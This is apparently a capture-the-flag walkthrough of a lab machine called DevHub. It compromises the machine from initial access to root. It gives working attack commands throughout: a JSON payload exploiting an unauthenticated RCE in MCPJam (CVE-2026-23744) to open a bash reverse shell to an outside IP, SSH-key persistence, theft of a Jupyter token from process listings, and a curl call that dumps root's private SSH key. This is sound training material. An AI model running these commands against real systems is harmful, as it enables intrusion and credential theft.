# DevHub

##

### 1. Initial Access

#### Enumeration

```bash
nmap -sC -sV -p- -T4 devhub.htb
```

Port 80 is open, serving the main site. The page references an internal tool running on port 6274. Browsing to `http://devhub.htb:6274` shows an MCPJam dashboard (an MCP - Model Context Protocol - development tool).

#### RCE via CVE-2026-23744

MCPJam's `/api/mcp/connect` endpoint is vulnerable to unauthenticated RCE (CVE-2026-23744). It accepts a JSON server config and passes the `command`/`args` fields straight to process execution with no validation:

```python
payload = {
    "serverConfig": {
        "timeout": 10000,
        "command": "bash",
        "args": ["-c", f"bash -i >& /dev/tcp/10.10.15.61/4444 0>&1"],
        "env": {}
    },
    "serverId": "rev"
}
```

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 script.py devhub.htb -p 6274 -l 10.10.15.61 --lport 4444
```

This returns a shell as `mcp-dev`.

#### Persistence

```bash
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1l... user@attacker" > ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

### 2. Lateral Movement to analyst

#### Finding the Jupyter token

```bash
ps aux | grep analyst
```

```
analyst   1077  ... /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
```

JupyterLab is running as `analyst` with the auth token exposed in the process arguments, visible to any user who can read `/proc` or run `ps aux`.

#### Pivoting in

Jupyter only binds to loopback, so tunnel it:

```bash
ssh -i ~/.ssh/htb_key -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb
```

Open `http://localhost:8888`, authenticate with the harvested token, and spawn a terminal from the notebook interface. This drops into a shell as `analyst`. Grab `user.txt`.

### 3. Privilege Escalation to root

#### Auditing opsmcp

`linpeas.sh` flags an internal automation service running as root:

```
root   1082  ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Reading `/opt/opsmcp/server.py` reveals two issues:

1. Auth is a hardcoded static key: `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"`.
2. A debug endpoint, `ops._admin_dump`, reads arbitrary files out of root's home with no additional checks:

```python
if target == "ssh_keys":
    with open('/root/.ssh/id_rsa', 'r') as f:
        key_data = f.read()
    return jsonify({"root_private_key": key_data})
```

#### Exploiting it

The service listens on `127.0.0.1:5000`. Tunnel it the same way:

```bash
ssh -i ~/.ssh/htb_key -L 5000:127.0.0.1:5000 analyst@devhub.htb
```

Call the admin dump endpoint with the static key:

```bash
curl -s -X POST 'http://localhost:5000/tools/call' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -H 'Content-Type: application/json' \
  -d '{"name": "ops._admin_dump", "arguments": {"confirm": true, "target": "ssh_keys"}}'
```

This returns root's SSH private key, JSON-escaped (`\n` as literal escape sequences, not real newlines).

#### Recovering the key

Don't try to manually fold or retype the key; parse the JSON properly so the escapes convert to real newlines:

```bash
curl -s -X POST 'http://localhost:5000/tools/call' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -H 'Content-Type: application/json' \
  -d '{"name": "ops._admin_dump", "arguments": {"confirm": true, "target": "ssh_keys"}}' \
  | jq -r '.root_private_key' > root_key

chmod 600 root_key
ssh -i root_key root@devhub.htb
```

Root logs in with no password. Read `/root/root.txt`.

### Summary

| Stage          | Vector                                                           |
| -------------- | ---------------------------------------------------------------- |
| Initial access | CVE-2026-23744, unauthenticated RCE in MCPJam                    |
| User           | Jupyter token exposed in process args                            |
| Root           | Hardcoded API key + arbitrary file read in opsmcp debug endpoint |
